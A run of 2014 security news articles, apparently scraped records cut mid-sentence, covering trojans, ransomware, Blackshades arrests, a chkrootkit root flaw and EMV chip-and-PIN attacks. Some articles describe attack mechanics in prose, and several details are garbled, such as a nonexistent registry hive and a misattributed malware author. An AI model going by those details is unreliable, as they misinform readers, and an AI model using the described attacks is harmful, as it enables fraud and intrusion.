plug-ins, which allows hackers to add extra features simply by writing new DLL (dynamic link library). The extra plug-ins easily add capabilities to the Trojan’s core functionality, that’s why the developer charge an extra of $500 USD to get the core application as well as its plugins, which allows cybercriminals to open reverse proxies on infected computers, to steal FTP credentials and to infect executable files in order to inject the malware at start up. \"The advent of a freshly coded new trojan malware application is not too common in the underground,\" Marcus writes, adding that the modular approach in Pandemiya could make it “more pervasive in the near future.\" The malware developers are also working on other new features to add reverse Remote Desktop Protocol connections and a Facebook attack module in order to spread the Trojan through hijacked Facebook accounts. HOW TO REMOVE PANDEMIYA TROJAN The Trojan can be easily removed with a little modification in the registry and command line action, as explained below: Locate the registry key HKEY_LOCAL_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and identify the *.EXE filename in your user’s ‘Application Data’ folder. Note the name, and delete the registry value. Locate the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls. Find the value with the same name as the *.EXE file in the previous step. Note the file name, and remove the value from the registry. Reboot the system. At this stage Pandemiya is installed but no longer running. Delete both files noted earlier. This will remove the last traces of the Trojan. Your system is now clean. Stay Safe!" }

PRIVILEGE ESCALATION VULNERABILITY IN LINUX KERNEL A privilege escalation vulnerability has been identified in the widely used Linux kernel that could allow an attackers to take the control of users’ system. On Thursday, the most popular distributor of open source Linux OS, Debian warned about this vulnerability (CVE-2014-3153) in a security update, along with some other vulnerabilities in the Linux kernel that may lead to a denial of service attack. The most critical one is the flaw (CVE-2014-3153) discovered by Pinkie Pie which resides in the futex subsystem call of Linux Kernel 2.6.32.62/3.2.59/3.4.91/3.10.41/3.12.21/3.14.5 versions, leaving a queued kernel waiter on the stack, which can be exploited to potentially execute arbitrary code with kernel mode privileges. \"Pinkie Pie discovered an issue in the futex subsystem that allows a local user to gain ring 0 control via the futex syscall,\" reads the advisory. \"An unprivileged user could use this flaw to crash the kernel (resulting in denial of service) or for privilege escalation.\" Pinkie Pie is the anonymous teenage ethical and skilled hacker who scooped at least $100,000 for bypassing the security features of Google's Chrome, many of them sandbox exploits, at both Pwnium and Pwn2Own competitions every year since 2012. RESEARCHER’S ADVICE Kees Cook, a Google Chrome OS security researcher and Ubuntu contributor said that the latest flaw found by Pinkie Pie is \"urgent to fix.\" \"Specifically, the futex syscall can leave a queued kernel waiter hanging on the stack. By manipulating the stack with further syscalls, the waiter structure can be altered. When later woken up, the altered waiter can result in arbitrary code execution in ring 0,\" Cook wrote Thursday on Seclists.org. \"This flaw is especially urgent to fix because futex tends to be available within most Linux sandboxes (because it is used as a glibc pthread primitive).\" CHKROOTKIT - ANOTHER CRITICAL FLAW The vulnerability highlighted two days after Thomas Stangner reported a serious flaw in the chkrootkit (Check Rootkit), a rootkit detector, that allows a local attacker to gain root access to gain root control by executing malicious code inside the /tmp directory. A common Unix-based program, chkrootkit helps system administrators to check their systems for known rootkits. The vulnerability in the chkrootkit, assigned CVE-2014-0476 ID, actually resides in the slapper() function in the shell script chkrootkit package. A non-root user can place any malicious executable file named 'update' in /tmp folder, which will get executed as root whenever chkrootkit will scan this directory for rootkits. OTHER VULNERABILITIES IN LINUX KERNEL Another security issues (CVE-2014-3144 and CVE-2014-3145) also have been discovered in the Linux kernel that could allow any local user to cause a Denial of Service (DoS) attack via crafted BPF instructions. Debian has issued the patches for these vulnerabilities and encouraged Linux users to upgrade their Linux packages highlighting that the issue has been fixed in the stable distribution, version 3.2.57-3+deb7u2, and will be fixed in the unstable distribution as soon as possible." }

Typically, the malicious software either lock victim’s computer system or encrypt the documents and files on it, in order to extort money from the victims. Though earlier we saw the samples of Ransomware tended to be simple with dogged determinations to extort money from victims. But with the exponential rise in the samples of Ransomware malwares, the recent ones are more subtle in design, including Cryptolocker, Icepole, PrisonLocker, CryptoDefense and its variants. Now, the ransomware dubbed as Crytowall, a latest variant of the infamous ransomware Cryptolocker is targeting users by forcing them to download the malicious software by through advertising on the high profile domains belonging to Disney, Facebook, The Guardian newspaper and others. Cryptolocker is designed by the same malware developer who created the sophisticated CryptoDefense (Trojan.Cryptodefense) ransomware, appeared in the end of March, that holds the victims’ computer files hostage by wrapping them with strong RSA 2048 encryption until the victim pays a ransom fee to get them decrypted. But unfortunately, the malware author failed to realize that he left the decryption keys left concealed on the user’s computer in a file folder with application data. So, to overcome this, the developer created Cryptowall ransomware and alike the latest versions of CryptoDefense, the infected system’s files and documents encrypted by CryptoWall are impossible to decrypt. The story broke, when researchers at Cisco revealed that cybercriminals have started targeting people with RIG Exploit Kits (EK) to distribute malicious Cryptowall ransomware malware. The Rig Exploit Kit was first spotted by Kahu Security in April, which checks for an unpatched version of Flash, Internet Explorer, Java or the Silverlight multimedia program on the infected users and if found, the system is instantly exploited by the bad actors. Researchers at Cisco have noticed high levels of traffic consistent with the new “RIG” exploit kit, thereby blocking requests to over 90 domains. On further investigation, the company observed that many of its Cloud Web Security (CWS) users were visiting on those malicious domains after clicking advertisements on high-profile domains such as “apps.facebook.com,” “awkwardfamilyphotos.com,” “theguardian.co.uk” and “go.com,” and many others. If clicked, the advertisements redirect victims to one of those malicious domains in order to malvertise users and once the system get infected with the RIG Exploit Kit, it will deliver the payload which includes the Cryptowall Ransomware malware. Now, when this CryptoWall is installed in the infected system, it will start scanning the system Hard Drive for data files and encrypt them. After encrypting the files on victim's system, it will create files containing ransom instructions in every folder it had encrypted, demanding up to $500 USD. The service where users are instructed to pay the ransom amount is a hidden service that uses the Command-and-Control server hosted on TOR .onion domain. The largest share of infections, some 42 percent, are in the United States, followed by England and Australia, but it believes that several groups and bad actors are involved in this attack chain." }

But, the malware just lock the mobile screen and a loophole in the its implementation allowed users to recover their device and data stored on SDcard.

Recently, the security firm ESET has discovered a new Android ransomware, dubbed as Android/Simplocker.A, that has ability to encrypt the files on the device SD card and then demand a ransom from the victim in order to decrypt those files. Once installed, the malware scans the SD card for certain file types such as image, document or video with extensions - jpeg, jpg, png, bmp, gif, pdf, doc, docx, txt, avi, mkv, 3gp, mp4 and encrypts them using AES in a separate thread in the background. After encrypting the files, the malware displays the following ransom message, written in Russian, which clearly means that this threat is targeting Russian Android users.“WARNING your phone is locked! The device is locked for viewing and distributing child pornography , zoophilia and other perversions. To unlock you need to pay 260 UAH. 1.) Locate the nearest payment kiosk. 2.) Select MoneXy 3.) Enter {REDACTED}. 4.) Make deposit of 260 Hryvnia, and then press pay. Do not forget to take a receipt! After payment your device will be unlocked within 24 hours. In case of no PAYMENT YOU WILL LOSE ALL DATA ON your device!”The Ransomware malware directs victim to pay the ransom amount i.e. 260 UAH, which is roughly equal to $21 US, through the MoneXy service, as this payment service is not easily traceable as the regular credit card. To maintain anonymity the malware author is using the Command-and-Control server hosted on TOR .onion domain and the malware sends the information of the infected device such as IMEI number to its server. The researchers at ESET are still analysing the malware:“Our analysis of the Android/Simplock.A sample revealed that we are most likely dealing with a proof-of-concept or a work in progress – for example, the implementation of the encryption doesn't come close to “the infamous Cryptolocker” on Windows.”The researchers have found that the malware is capable to encrypt the victim’s files, which could be lost if the decryption key is not retrieved from the malware author by paying the ransom amount, but on the other hand the researchers strongly advise users against paying fine, as their is no guarantee that the hacker will provide you decryption keys even after paying the amount. Unfortunately, mobile antivirus products are only capable to detect such known/detected threats only and can't detect similar the new threats. So, it is important for you to always keep the back-up of all your files either manually on the computer system or use cloud backup services like dropbox, google drive etc, in order to protect it from the emerging threats." }

Recently, security researchers at the Antivirus firm TrendLabs have unearthed another sophisticated variant of the ransomware malware which is employing Windows PowerShell in an effort to encrypt files on the victims’ computer. The firm detected the variant as TROJ_POSHCODER.A. Windows PowerShell is a task automation and configuration management framework from Microsoft, consisting of a command-line shell and associated scripting language. It provides full access to COM and WMI, enabling administrators to perform administrative tasks on both local and remote Windows systems as well as WS-Management and CIM enabling management of remote Linux systems and network devices. It is believed that cybercriminals have used this feature of Windows just in order to make the detection and analysis of the malware harder on an affected system. However, they failed at this point as using Windows PowerShell feature made it much easier for the researchers to detect the malware. “In this case, using PowerShell made it easier to detect as this malware is also hard-coded,” reads the blog post. “Decrypting and analyzing this malware was not too difficult, particularly compared to other ransomware variants.” TROJ_POSHCODER.A is a script-based malware as it is using the Windows PowerShell feature. The malware makes use of the Advanced Encryption Standard (AES) to encrypt the files, and RSA-4096 public key cryptography to exchange the AES key with the victims in order to decrypt the files. Once the ransomware is installed and executed on the victim’s Windows System, it encrypts the existing files on the infected system and then renames them to {filename}.POSHCODER. In Addition, it also drops UNLOCKYOURFILES.html into every folder. As soon as all the files on the infected system are encrypted, it displays a message to victims saying “Your files were encrypted and locked with a RSA4096 key” and ask them to follow some given instructions in order to decrypt their files as shown in the screenshot: The instructions in the Ransom note takes users to another page as shown below, asking victims to download the Multibit application to have their own Bitcoin-wallet account for 1 Bitcoin. After victims purchase the application, they are instructed to fill and submit the form that contains information such as victims’ email address, BTC address and ID, as a result to get decryption keys from the threat actors. This new variant have primarily affected English speaking targets in the United States. In our previous articles, we highlighted many variants of Cryptolocker and other similar threats that has ability to perform additional tasks such as using different languages in their warning and stealing virtual currency from cryptocurrency wallets. CryptoLocker is especially dangerous because of its infection rate and it is the most damaging Windows virus in a series of recent ransomware Trojans. We also reported last month that cybercriminals have now begun targeting Smartphones with a special piece of malicious software that locks up the devices until the victims pay a ransom to get the keys to unlock the phone, which highlights how money motivated criminals are continuously improving these threats over time. What Steps can you take to reduce the risk of your equipment becoming infected? Users are advised to never open email attachments from unknown sources and make backup of your important data to an external device or on the cloud storage. If you believe you have been infected, act quickly. Stay Safe!" }

Alex Yucel, 24, who is the co-author of the Blackshades Remote Access Trojan (RAT), owned and operate an organization called Blackshades, which sold the notorious software to the other people and hackers across the country for prices ranging from $40 to $50. This allowed the hackers to remotely control the victims’ computers and to steal keystrokes, passwords and access to victims’ private files, according to the authorities. Blackshades malware is designed to steal victims’ usernames and passwords for email and Web services, instant messaging applications, FTP clients and lots more. In worst cases, the malicious software program even allows hackers to take remote control of users’ computer and webcam to take photos or videos without the knowledge of the computer owner. Yucel a.k.a. \"marjinz,\" a.k.a. \"Victor Soltan,\" was arrested in November 2013 in Moldova, as part of an International crackdown on the malicious BlackShades RAT and during the same time the source code of the tool was also leaked on the Internet. He was extradited to the United States shortly after it. The accused developed the RAT along with the help of US citizen Michael Hogue, who has already pleaded guilty. “Yucel ran his organization like a business—hiring and firing employees, paying salaries, and updating the malicious software in response to customers’ requests. He employed several administrators to facilitate the operation of the organization, including a director of marketing, a website developer, a customer service manager, and a team of customer service representatives,” the FBI said in a statement. Alex Yucel faces two counts of computer hacking, one count of conspiring to commit access device fraud, one count of access device fraud and one count of aggravated identity theft. But, during Thursday's hearing in Manhattan federal court, Yucel told U.S. District Judge Kevin Castel that he pleaded not guilty to the charges brought against him that included conspiring to commit access device fraud and access to device fraud. However, according to prosecutor Sarah Lai, their are several evidence against him, including a number of laptops, computers, tablets, e-mail accounts and BlackShades subscriber records as well, and if convicted, he faces up to 17 years in prison. In mid-May, the law enforcement authorities in the United States and Europe announced a large-scale operation of International raids against individuals suspected of developing, selling and using the notorious BlackShades RAT. The raids took place in more than 100 countries and the federal authorities have seized 1,900 command and control domains and arrested more than 100 people worldwide involved in the purchasing, selling or using of the Blackshades malware. In 2012, the BlackShades RAT was also used to infect and Spy on Syrian activists, while a very serious and bloody internal war between the government and the opposition forces. BlackShades tool was actually developed by an IT surveillance and security-based company, as a tool for parents to monitor their Children activities and for finding the cheating partners in relationship. But, as usual the cyber criminals have made it a favourite tool to carry out illicit activities." }

WeChat is a famous mobile instant messaging app developed by Chinese company Tencent, with more than 355 million users across the world. The app offers people to chit-chat with their friends and relatives, and also allows users to make payments for goods and services on WeChat. The Payment feature of the app requires users’ bank account details to their messenger account and this is what tempting cybercriminals to develop new and more sophisticated banking Trojans and malwares. The security researchers at Kaspersky Lab have uncovered such banking Trojan, dubbed as Banker.AndroidOS.Basti.a, which looks exactly like the legitimate WeChat application for Android devices. While installation, it also requires the same permissions such as to access the Internet, received SMSs, and other services just like the real Wechat app. Researchers found that some modules of the malware app are encrypted and this feature makes it different and sophisticated from other Mobile banking malwares. The malware authors have used an effective encryption in order to prevent Banker.AndroidOS.Basti.a trojan from reverse engineering of the code. However, the Kaspersky researchers have successfully managed to decode the threat module and found that the malware is capable to perform various types of malicious tasks, including its more professional GUI, which makes it an efficient phishing tool. Once the malicious WeChat app installed on the victims’ android devices, they are served a page asking to enter some useful information including their phone numbers, payment card numbers, PINs and other financial data. As soon as a victim provides the personal details to the fake app, it sends them back to an email account controlled by the malware author. “This Trojan-Banker also registered a BootReceiver. It will monitor newly received text messages and uninstall broadcasts from the infected mobile.” they noticed. The email account name and password details are hard-coded in the source code of the trojan and researchers have successfully retrieved it. They logged into the attackers email account and found that the banking trojan has already made lots of victims. As the online apps are becoming more popular among the people, hence becoming an easy and a tempting target for cyber thieves. So, its up to you to better safeguard your data privacy. Make sure that you have installed a reputed mobile security software in your devices. Always update your software applications to the latest version and avoid providing your sensitive information to any suspicious websites or downloading any app from any untrusted source." }

The Heartbleed vulnerability made headlines around the world and my last article explains everything about probably the biggest Internet vulnerability in recent history, but still some readers are not aware of its nature, otherwise they would not have been a victim of the spam campaigns. Spammers are very smart on gaining from every opportunity they get, so this time they are taking advantage of the infamous Heartbleed bug and frighten the users into installing Anti-Heartbleed Software onto their systems, which is obviously a malware. The researchers at Symantec have unearthed a spam campaign targeting people by sending spam emails that warns them their system may still be “infected” with the Heartbleed bug and request them to run the Heartbleed bug removal tool (attached to the email, as shown below) in order to remove the virus from their system. The people with a little knowledge of the OpenSSL Heartbleed Bug may follow what the spammers say, despite websites around the world flooded with the Heartbleed articles, explaining how it works, how to protect, and exactly what it is. Yet many didn’t get it right. We too explained almost everything related to the nature of the bug and the foremost myth of the people about the bug is answered in our top question that explained Heartbleed is not a Virus or Malware, instead it’s a vulnerability resided in TLS heartbeat mechanism built into certain versions of the popular open source encryption standard OpenSSL. So, how could you go with the spammers in cleaning up your system to protect your systems from Heartbleed infection or malware? Now, this is something which is unacceptable and allows cybercriminals to targets users with less technical knowledge to know that the Heartbleed vulnerability is not at all an infection or a malware. “The spam email uses the social and scare tactics to lure users into opening the attached file,” reads the blog post. The email tricks users by masquerading itself to come from a very popular password management company, with the details to run the attached removal tool, along with the measures if users’ antivirus software blocks it. Users feel safe to open the attachment as the attached file seems to be a docx file, but once it is opened, it will serve an encrypted zip file to the user. When the user extracts the zip file content, they will find a malicious .exe file that represents itself as the Heartbleed bug removal tool. Once the .exe file is executed by the user, it downloads a keylogger in the background without their knowledge, whereas the user shows a popup on the screen with a progress bar. After a while, a message flash on the screen reporting users that Heartbleed bug was not found and the computer is clean. The user may feel relieved after knowing that the Heartbleed bug has not affected them, but during the same time they are unaware of the key-logger software installed in background and recording keystrokes, screenshots and sending all the personal information of users to the cyber criminals. Users are recommended not to click on any link in the suspicious messages and better use your common sense and knowledge at right time and right place, because security researchers, experts and we sitting here can only provide you knowledge about the various vulnerabilities and measures to get rid of it, but else is up to you to protect yourself from these kind of security threats." }

Such Malware first try to trick users into downloading it and then demanding payment to restore user control of the device. This morning reports came out that cybercriminals have targeted a large number of users of Apple's iCloud connected devices with a sophisticated Ransomware in Australia. The owners of iPhone, Mac and iPads are finding their devices locked remotely through iCloud and a message originating in Apple's find my device service that states \"Device hacked by Oleg Pliss\". One user wrote on Apple Support Forum, \"I went to check my phone and there was a message on the screen (it's still there) saying that my device(s) had been hacked by 'Oleg Pliss' and he/she/they demanded $100 USD/EUR (sent by paypal to lock404(at)hotmail.com) to return them to me.\" The Locked Devices are prompting to send up to US$100 to a Paypal account of the suspected hacker in order to have them unlocked. But we urge our users not to send money to the given account, as PayPal spokesman confirmed that, ‘There's no PayPal account linked to hacker email addr and any customer who has sent money will be refunded’ HOW HACKERS LOCKED THE DEVICES? This case is quite different because phones are not infected by any malicious application, but rather hackers allegedly hijacked Apple's 'Find My iPhone' feature, which allowed them to remotely lock iOS and Mac devices and send messages demanding ransom money. It appears that Australian hackers are using compromised iCloud accounts, exposed in some recent security breaches and the hacked accounts were likely not using two-step verification. But those users who have set Passcode for a two-step verification on their Apple devices haven't fallen victim to this attack, because just account password will not be sufficient for hackers to gain device access. Users can still recover their device by resetting the device in \"recovery mode\", but in this process you will lose all your apps and data stored on the device. Apple has not yet officially commented on the issue but users are recommended to turn on two-step verification for their Apple ID with the directions available on Apple’s support page." }

In most cases, cybercriminals use to spread the malicious software via an email, but distribution of malware through social media is relatively new tantrum of cyber criminals, as more people are fond of social media platforms now a days. Adam discovered the scam and according to him the worst part of this new Twitter scam is that even without realizing the impact of this fake news, other Twitter users are retweeting from their accounts, making the malware scam more worse. The tweets contain links lead to a news video on the Wall Street Journal and once you click on the link to watch the news video, you'll be first asked to install Adobe Flash Player. As soon as you click on the \"Install\" icon, it will actually start downloading a piece of malware and this malware then further could be used by the spammers to download even more sophisticated malware onto your system. The researcher analyzed the malware and found it to be a remote access Trojan (RAT), which is possibly related to the Darkcomet RAT. “According to my own dynamic analysis, the malware creates an establish connection with a remote server and drops additional malware, such as the “notepad.exe” that is found in the Temp folder and beaconing out to the same remote server as the initial Install file,” said Adam. The URL of the link is actually sticking to the domain “www.siam-sunrise.com” which belongs to a website for a business in Thailand. Aside from the URL, the phishing site looks quite legitimate to the Wall Street Journal website with WSJ logo to trick the visitors. Twitter has already shut down numerous accounts related to the spam and users are highly recommended to have a good anti-virus solution on their systems and avoid clicking any suspicious link and if found, immediately report the suspicious tweets to Twitter as Spam." }

Due to the lack of concern and security measures, point-of-sale (POS) systems have become an attractive target for cybercriminals and malware writers. BlackPOS malware caused massive data breaches in various US retailers targeting POS machines and the largest one is TARGET data breach occurred during the last Christmas holidays. The third-largest U.S. Retailer in which over 40 million Credit & Debit cards were stolen, used to pay for purchases at its 1500 stores nationwide in the U.S. Neiman Marcus, Michaels Store were also targeted involving the heist of possibly 110 million Credit-Debit cards, and personal information. BlackPOS malware was embedded in point-of-sale (POS) equipment at the checkout counters to collect secure data as the credit cards were swiped during transactions. Now the latest one is the ‘Nemanja botnet,' a recently discovered new piece of malware that has infected almost 1,500 point-of-sale (POS) terminals, accounting systems and other retail back-office platforms from businesses across the world. \"The bad actors combine several attack vectors in order to infect operators’ stations – “drive-by-download” and remote administration channels hacking.\" researchers said. This massive, global botnet campaign was unearthed by the Security researchers at the cybercrime intelligence firm IntelCrawler, which includes more than 1,478 hosts in almost 35 countries worldwide, including the U.S., UK, Canada, Australia, China, Japan, Israel and Italy, as well as other developing countries. “The analyzed botnet has affected various small businesses and grocery stores in different parts of the world, making the problem of retailers’ insecurity more visible after past breaches. Past incidents showed high attention from modern cybercriminality to retailers and small business segments having Point-of-Sale terminals.” Intercrowler explained in a blog post. IntelCrawler is the company that most actively investigate the electronic crimes related to the Point-of-Sale (POS) systems. IntelCrawler is also the same firm that discovered the BlackPOS malware used in Target data breach and it also had traced the malware author of BlackPOS malware in the beginning of the year. Nemanja botnet was discovered by the cyber intelligence company in March. It includes POS malware with keylogging capabilities that is highly being used by cybercriminals to steal sensitive information such as username and passwords and in this case, attackers used this feature to steal payment or personal identifiable data from various bank office systems and databases. \"IntelCrawler predicts that very soon modern POS malware will become a part of RAT/Trojans and other harmful software acting as a module, which may be used along with keylogger and network sniffing malware.\" Intercrowler explained. IntelCrawler predicts a significant increase for the number of data breaches in the future and that in coming days modern PoS malware will be incorporated as modules into malicious remote access tools (RATs) or other Trojan programs and will be used along other components, like those for keylogging or network traffic sniffing. Point-of-sale (POS) systems are critical components in any retail environment and users are not aware of the emerging threats it poses in near future, so to overcome the upcoming threats we should know its architecture, the areas of attacks and the defense measures. For this you can refer a Book 'Hacking Point of Sale: Payment Application Secrets, Threats, and Solutions' to grab the in-depth research of the point-of-sale (POS) systems, how it works, how it could be exploited, and what protection measures should be taken." }

Unlike traditional magnetic stripe payment cards, EMV chip cards generates a unique code for every transaction, making it nearly* impossible for criminals to use the card for counterfeit fraud. But Nothing is perfectly secure, even not the PIN-and-Chip based payment cards. All anti-cloning theories were already proven wrong, when a group of researchers found a way to hack the Credit and Debit cards based on the latest Chip-and-Pin technology. Back in 2012, we reported about a research paper entitled “Chip and Skim: cloning EMV cards with the pre-play attack” published (old paper) by team of researchers from the University of Cambridge, UK, who demonstrated that Chip and PIN payment card systems are also vulnerable to Card Cloning. The same team of researchers presented their EVM related research last Monday at the 2014 IEEE Symposium on Security and Privacy in San Jose, California. But this time they include one more critical vulnerability to the research paper (new modified research paper). The Group includes Mike Bond, Omar Choudary, Steven J. Murdoch, Sergei Skorobogatov and Ross Anderson from the Computer Science Department. In Total, they presented two critical vulnerabilities in the \"Chip-and-PIN\" smart card payment system that makes EVM vulnerable to “pre-play” attack. PREDICTING SO-CALLED 'UNPREDICTABLE NUMBERS' EMV devices generate the so-called \"unpredictable numbers\" (UNs) for every transaction, but the researchers claimed that automated teller machines (ATMs) and point-of-sale (POS) terminals fail to properly generate random numbers that are required by the EMV protocol to securely authenticate transaction requests. Researchers claimed to have found the computation patterns that would allow them to predict the randomly generated numbers. ‘EMV implementers have merely used counters, timestamps or home-grown algorithms to supply this nonce.’ The vulnerability could be exploited by the cybercriminals to clone the credit and debit cards in such a manner that even bank procedures won’t differentiate between the legitimate and fraud transactions. NO PIN REQUIRED They also demonstrated the Proof-of-Concept of another critical vulnerability, known as ‘no PIN’, which lets criminals use stolen chip and PIN cards without knowing the PIN. Using a Malware or by performing a man-in-the-middle attack on the communications between a pin terminal and a customer's card allows the hacker to read off sufficient information to create a cloned card. “The flaw is that when you put a card into a terminal, a negotiation takes place about how the cardholder should be authenticated: using a PIN, using a signature or not at all. This particular subprotocol is not authenticated, so you can trick the card into thinking it’s doing a chip-and-signature transaction while the terminal thinks it’s chip-and-PIN. The upshot is that you can buy stuff using a stolen card and a PIN of 0000 (or anything you want). We did so, on camera, using various journalists’ cards. The transactions went through fine and the receipts say ‘Verified by PIN’.” the researcher explained. CRIMINALS ALREADY USING THIS EXPLOIT The worst fact about the vulnerability is that, the trick is already known to cyber criminals and fraudsters from past many months and currently they are even equipped with crime-ware hardwares those allow them to clone Chin-and-PIN based cards easily. The Chip-and-PIN system has a 700-odd page manual, but the researchers says it has so many security holes in it, the whole thing should be re-written. The adoption of EVM payment system is in the response to the massive data breach in one of the U.S largest retailers 'Target', marked the largest card heists in the U.S. history in which financial credentials of more than 110 million customers were compromised. The data heist in various US retailers have forced them to take some major steps towards more secure transactions and they move on to the new Chip-and-Pin technology. However, Chip-and-Pin payment system is considered to be a safer than the \"card swipe\" payment system, but that doesn’t mean it is fully protected. Cyber Criminals are just behind you every time to fetch your money, so be alert." }

The news broke when various announcements on underground forums by hacking group members claimed that FBI especially going after all of them who purchased the hacking tool using PayPal as payment option. Today, the UK's National Crime Agency announced that the raids took place in more than 100 of countries and they have arrested more than 100 people worldwide involved in the purchasing, selling or using the Blackshades malware. More than half million computers in more than dozens of countries were infected by this sophisticated malware that has been sold on underground forums since at least 2010 to several thousands people, which cost between 40 and 100 dollars. The Investigation involved the law enforcement coordination agencies Europol and Eurojust said Monday that authorities raided a total of 359 houses in 13 different European countries, including Austria, Belgium, Britain, Croatia, Denmark, Estonia, Finland, France, Germany, Italy, Moldova, the Netherlands and Switzerland, as well as in the United States, Canada and Chile, and seized cash, firearms, drugs and over 1,100 data storage devices including computers, laptops, mobile phones, routers etc. “This case is a strong reminder that no one is safe while using the internet, and should serve as a warning and deterrent to those involved in the manufacture and use of this software,” said Koen Hermans, an official representing the Netherlands in the European Union's criminal investigation coordination unit, Eurojust. “This applies not only to victims, but also to the perpetrators of criminal and malicious acts. The number of countries involved in this operation has shown the inherent value in Eurojust’s coordination meetings and coordination centres.” As we reported in previous article, the Blackshades website (http://bshades.eu/) has now been seized by the FBI. ‘Blackshades’ is a remote administration tool (RAT) and is sold legally around the world but bad intention actors are using the tool as a malware for collecting private information of innocent users, including usernames and passwords for email and Web services, instant messaging applications, FTP clients and lots more. In worst cases, the malicious program even allows hackers to take remote control of users’ computer and webcam to take photos or videos without the knowledge of the computer owner. The infected PCs can also be hijacked by the attackers to perform DDoS attacks and other illegal activities without any knowledge of its owner. The program modifies itself in such a way so that it remains elusive for antivirus software. In 2012, while a very serious and bloody internal war between the government and the opposition forces, the BlackShades RAT was also used to infect and Spy on Syrian activists. However, in 2012, a developer of the Blackshades team was reportedly arrested and during same time the source code of the tool was also leaked on the Internet.

According to the French media reports and various announcements on underground forums by hacking groups, the FBI has started a large-scale operation of International raids with the help of local law enforcement authorities to arrest a particular group of cyber criminals and Hackers. The FBI has targeted the customers of a popular Remote Administration Tool (RAT) called ‘blackshades’, which allows them to connect and manage thousands of remotely infected computers over the Internet. WHAT IS BLACKSHADES RAT?? ‘Blackshades’ is a remote administration tool (RAT) which allows an attacker to control several clients from around the world. Blackshades malware is fully equipped with Drive-by attacks, Java exploits, keylogger and it allows an attacker to steal usernames and passwords for email and Web services, instant messaging applications, FTP clients and lots more. In worst cases, the program even allows hackers to take remote control of users’ computer and webcam to take photos or videos without the knowledge of the computer owner. The infected PCs can also be used to perform DDoS attacks and other illegal activities without any knowledge of its owner. The program modifies itself in such a way so that it remains elusive for antivirus software. It has been sold on underground forums since at least 2010, which cost between 40 and 100 dollars. In 2012, while a very serious and bloody internal war between the government and the opposition forces, the BlackShades RAT was also used to infect and Spy on Syrian activists. However, Back in 2012, a developer of the Blackshades team was reportedly arrested and during same time the source code of the tool was also leaked on the Internet. FBI RAID AND SEIZURE On various hacking forums, members claimed that FBI especially going after all of them who purchased the hacking tool using PayPal as payment option, so it could be estimated that PayPal is cooperating with the FBI. Some claimed, even if the FBI has no record or evidence that those customers committed any crime or not, they are still raiding in search of logs and proofs. Few users of ‘Blackshades’ Tool posted on the Hack Forums website that their houses are being raided by the FBI. A user from Germany reported that he was visited by German police on purchased of the BlackShades RAT and agents seized his PC, laptop, external hard drive, and cryptography-related documents. Another user from the Netherlands posted on the Hack Forums that he too has been visited by seven agents of the country’s cyber crime police, who seized his phone, computer and other electronics as well. The current ongoing FBI raid-campaign is targeting only European, including Belgium, UK, Denmark, Italy, Sweden and even the Australian Customers, but till now we have not seen any evidence of raids in the US or Canada. FBI has also seized the European domain of BlackShades official website (www.eurid.eu) and modified the owner details to 'Federal Bureau of Investigation', as shown. Marjinz, a member of BlackShades developer team claimed on a forum that FBI got their customer database from his Hotmail, but he even didn't know HOW! It could be possible that Microsoft has provided the content from developer's Hotmail account to the FBI. FBI WARNING TO HACKERS This could be in response to the latest Wednesday announcement of the FBI that it is planning searches and multiple arrests of cyber criminals over the next several weeks for combating cybercrime, Reuters reported. \"There is a philosophy change. If you are going to attack Americans, we are going to hold you accountable,\" the FBI's Robert Anderson told the Reuters. \"If we can reach out and touch you, we are going to reach out and touch you.\" BlackShades tool was actually developed by an IT surveillance and security-based company, who promoted it as a tool for parents to monitor their Children activities and for finding the cheating partners in relationship. But, as usual every weapon could be used for both purposes, killing and saving lives. Update: One of our reader from Canada confirmed that his house was also raided by 'Royal Canadian Mounted Police' (FBI of Canada) two days ago. 'My son bought Blackshades and they had a warrant and search the entire house. They confiscated his computer.' he said." }

But that doesn't mean that the group was inactive, rather defacing the websites, the group was planning something bigger. The Group of hackers at Ajax Security Team last defaced a website in December 2013 and after that it transitioned to sophisticated malware-based espionage campaigns in order to target U.S. defense organizations and Iranian dissidents, according to the report released by FireEye researchers. “The transition from patriotic hacking to cyber espionage is not an uncommon phenomenon. It typically follows an increasing politicization within the hacking community, particularly around geopolitical events,” researchers Nart Villeneuve, Ned Moran, Thoufique Haq and Mike Scott wrote in the report. “This is followed by increasing links between the hacking community and the state, particularly military and/or intelligence organizations.” The security firm has been tracking the activities of the hacking group on online forums and identified some of the group's prominent members by their screen names, \"HUrr1c4nE!\" and \"Cair3x.\" FireEye found that the Ajax Security Team appeared to be formed in 2010, have stopped the website defacement attacks and started more targeted attacks with the aim to retrieve the information from systems through their own custom designed malware. The group dubbed the malware as ‘Stealer,’ which isn't particularly much advanced like the malwares are today, still very effective and sophisticated. Stealer uses common techniques to steal credential data and is built into a CAB extractor. Once activated, the extractor drop a malware called IntelRS.exe, which adds a backdoor to the target system that communicates with command-and-control servers over FTP, keylogger and screenshot-grabbing tools. The malware has capability to steal browser information such as bookmarks and history and also collects system information such as running processes, IP addresses and many more. In the report titled “Operation Saffron Rose”, the malware campaign disclosed that the team used email, inbox messages over various social networks, fake login pages and the propagation of anti-censorship software infected with malware to lure targets into installing malicious software and revealing credentials from their machines. In one case, the group targeted the Western Defense companies, particularly those in the Aerospace industry, using a fake registration page impersonating the IEEE Aerospace conference. In order to do this, first the group registered the domain aeroconf2014[.]org, similar to the legitimate conference domain, and then sent out emails to companies in the field with a link to their fake site. Once they visited the site and tries to register themselves for the conference, they would be prompted to install proxy software in order to access the website. But, the software was actually a Stealer malware, FireEye said. In addition to it, the attackers also used phishing emails to grab credentials for a variety of online services such as Outlook Web Access and VPN logins. “The increased politicization of the Ajax Security Team, and the transition from nuisance defacements to operations against internal dissidents and foreign targets, coincides with moves by Iran aimed at increasing offensive cyber capabilities,” the security firm concluded. “While the relationship between actors such as the Ajax Security Team and the Iranian government remains unclear, their activities appear to align with Iranian government political objectives.” The researcher also discovered a command-and-control server used by the group to store victims’ stolen data and recovered the data of 77 infected victims targeted by the group. Most of the victims had their computers set to Iran's time zone and Persian language. The firm also unearthed evidence the group targeted U.S. defense contractors. FireEye states that the objectives of Ajax team are apparently consistent with the efforts of Iranian government to control political opposition and to expand its offensive cyber capabilities." }

